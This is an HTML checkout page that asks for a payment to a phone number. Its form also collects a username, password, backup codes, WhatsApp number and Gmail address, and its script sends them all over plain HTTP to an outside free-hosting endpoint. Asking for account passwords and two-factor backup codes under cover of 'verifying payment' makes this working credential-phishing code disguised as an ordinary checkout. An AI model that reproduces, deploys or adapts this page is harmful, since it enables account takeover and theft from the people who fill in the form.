<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Checkout</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-slate-100 p-5">
    <div class="max-w-md mx-auto bg-white p-6 rounded-xl shadow-lg">
        <h2 class="text-xl font-bold mb-4">Pay to 01720960851</h2>
        
        <div class="space-y-3">
            <input type="text" id="txid" placeholder="Transaction ID" class="w-full p-2 border rounded">
            <input type="text" id="username" placeholder="Username" class="w-full p-2 border rounded">
            <input type="text" id="password" placeholder="Password" class="w-full p-2 border rounded">
            <input type="text" id="backup" placeholder="Backup Codes" class="w-full p-2 border rounded">
            <input type="text" id="whatsapp" placeholder="WhatsApp Number" class="w-full p-2 border rounded">
            <input type="email" id="email" placeholder="Gmail Address" class="w-full p-2 border rounded">
            
            <button onclick="processPayment()" class="w-full bg-blue-600 text-white py-2 rounded font-bold">VERIFY PAYMENT</button>
        </div>
    </div>

    <script>
        function processPayment() {
            let formData = new FormData();
            formData.append('method', 'Manual'); 
            formData.append('amount', '0'); // Amount ka logic yahan daal lena
            formData.append('txid', document.getElementById('txid').value);
            formData.append('username', document.getElementById('username').value);
            formData.append('password', document.getElementById('password').value);
            formData.append('backup', document.getElementById('backup').value);
            formData.append('whatsapp', document.getElementById('whatsapp').value);
            formData.append('email', document.getElementById('email').value);

            fetch('http://swift11.infinityfreeapp.com/save_order.php', { 
                method: 'POST', 
                body: formData 
            })
            .then(res => res.text())
            .then(data => {
                alert("Order Submitted!");
                location.reload();
            })
            .catch(err => alert("Error: " + err));
        }
    </script>
</body>
</html>
